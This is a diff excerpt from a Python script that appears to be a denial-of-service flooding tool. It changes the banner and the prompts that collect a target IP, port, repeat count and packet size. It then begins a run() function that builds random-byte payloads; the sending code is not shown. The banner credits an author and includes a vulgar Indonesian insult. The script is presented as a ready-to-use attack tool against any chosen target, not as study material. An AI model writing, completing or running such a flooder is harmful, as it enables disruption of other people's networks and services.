@@ -66,16 +66,16 @@ print("\033[21m ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  ")
 print("\033[21m   ░       ░        ░ ░        ░  ") 
 print("\033[21m ░       ░                        ") 
 print("""\033[97m======================================
-\033[91m<\> Code : ZieLx
-\033[91m<\> Join King Community
-<\> Anak Kontol Mau Rename
+\033[91m[ • ] Code : ZieLx
+\033[91m[ + ] Join King Community
+[ $ ] Anak Kontol Mau Rename
 \033[97m======================================""")
 
-ip =str(input("\033[96m<\> Ip Target :\033[91m "))
-port =int(input("\033[96m<\> Port Target : \033[91m"))
-times =int(input("\033[96m<\> Times :\033[91m "))
-size =int(input("\033[96m<\> Size :\033[91m "))
-choice =str(input("\033[96m<\> Ready? (y/n) :\033[91m "))
+ip =str(input("\033[96m[ 1 ] Ip Target :\033[91m "))
+port =int(input("\033[96m[ 2 ] Port Target : \033[91m"))
+times =int(input("\033[96m[ 3 ] Times :\033[91m "))
+size =int(input("\033[96m[ 4 ] Size :\033[91m "))
+choice =str(input("\033[96m[ 5 ] Ready? (y/n) :\033[91m "))
 
 def run():
 	size = os.urandom(1025)
